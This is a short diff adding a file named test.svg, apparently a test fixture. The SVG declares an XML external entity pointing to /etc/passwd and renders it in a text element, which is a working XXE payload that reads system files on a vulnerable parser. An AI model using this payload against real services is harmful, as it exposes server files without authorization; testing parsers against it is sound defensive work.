@@ -1,0 +1,8 @@
+<!-- test.svg -->
+<?xml version="1.0"?>
+<!DOCTYPE data [
+  <!ENTITY etc_passwd SYSTEM "file:///etc/passwd">
+]>
+<svg xmlns="http://www.w3.org/2000/svg">
+  <text x="10" y="20">&etc_passwd;</text>
+</svg>
